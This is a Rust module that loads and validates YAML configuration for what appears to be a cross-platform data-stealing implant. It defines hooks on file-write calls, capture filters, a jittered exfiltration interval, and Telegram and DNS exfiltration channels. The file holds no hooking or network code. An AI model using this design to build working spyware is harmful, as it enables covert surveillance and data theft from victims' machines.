// Unified Configuration Format - Cross-Platform YAML
// Single configuration file that works across all platforms

use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use anyhow::{Result, Context};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnifiedConfig {
    pub mission: MissionConfig,
    pub hooks: HooksConfig,
    pub filters: Vec<FilterConfig>,
    pub exfiltration: ExfiltrationConfig,
    pub channels: ChannelsConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MissionConfig {
    pub id: String,
    pub name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HooksConfig {
    pub functions: Vec<HookFunction>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookFunction {
    pub name: String,
    #[serde(default)]
    pub linux: Option<String>,
    #[serde(default)]
    pub windows: Option<String>,
    #[serde(default)]
    pub macos: Option<String>,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilterConfig {
    pub pattern: String,
    pub r#type: String,
    #[serde(default)]
    pub platforms: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExfiltrationConfig {
    pub interval_seconds: u64,
    pub jitter: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChannelsConfig {
    pub primary: String,
    pub fallbacks: Vec<String>,
}

pub struct ConfigLoader;

impl ConfigLoader {
    /// Load unified configuration from YAML
    pub fn load_from_yaml(path: &str) -> Result<UnifiedConfig> {
        #[cfg(feature = "config-yaml")]
        {
            use std::fs;
            let content = fs::read_to_string(path)
                .context("Failed to read config file")?;
            
            let config: UnifiedConfig = serde_yaml::from_str(&content)
                .context("Failed to parse YAML")?;
            
            Ok(config)
        }
        
        #[cfg(not(feature = "config-yaml"))]
        {
            Err(anyhow::anyhow!("YAML support requires 'config-yaml' feature"))
        }
    }
    
    /// Get platform-specific function name
    pub fn get_function_name(config: &HookFunction) -> Option<String> {
        #[cfg(target_os = "linux")]
        {
            config.linux.clone().or_else(|| Some(config.name.clone()))
        }
        
        #[cfg(target_os = "windows")]
        {
            config.windows.clone().or_else(|| Some(config.name.clone()))
        }
        
        #[cfg(target_os = "macos")]
        {
            config.macos.clone().or_else(|| Some(config.name.clone()))
        }
        
        #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
        {
            Some(config.name.clone())
        }
    }
    
    /// Validate configuration
    pub fn validate(config: &UnifiedConfig) -> Result<()> {
        // Validate mission ID
        if config.mission.id.is_empty() {
            return Err(anyhow::anyhow!("Mission ID cannot be empty"));
        }
        
        // Validate hooks
        for hook in &config.hooks.functions {
            if hook.name.is_empty() {
                return Err(anyhow::anyhow!("Hook name cannot be empty"));
            }
        }
        
        // Validate filters
        for filter in &config.filters {
            // Validate regex
            regex::Regex::new(&filter.pattern)
                .context("Invalid regex pattern")?;
        }
        
        // Validate exfiltration interval
        if config.exfiltration.interval_seconds == 0 {
            return Err(anyhow::anyhow!("Exfiltration interval cannot be zero"));
        }
        
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_unified_config() {
        let config = UnifiedConfig {
            mission: MissionConfig {
                id: "0xDEADBEEF".to_string(),
                name: "Test Mission".to_string(),
            },
            hooks: HooksConfig {
                functions: vec![HookFunction {
                    name: "file_write".to_string(),
                    linux: Some("fwrite".to_string()),
                    windows: Some("WriteFile".to_string()),
                    macos: Some("fwrite".to_string()),
                    enabled: true,
                }],
            },
            filters: vec![],
            exfiltration: ExfiltrationConfig {
                interval_seconds: 3600,
                jitter: 0.25,
            },
            channels: ChannelsConfig {
                primary: "telegram".to_string(),
                fallbacks: vec!["dns".to_string()],
            },
        };
        
        assert!(ConfigLoader::validate(&config).is_ok());
    }
}


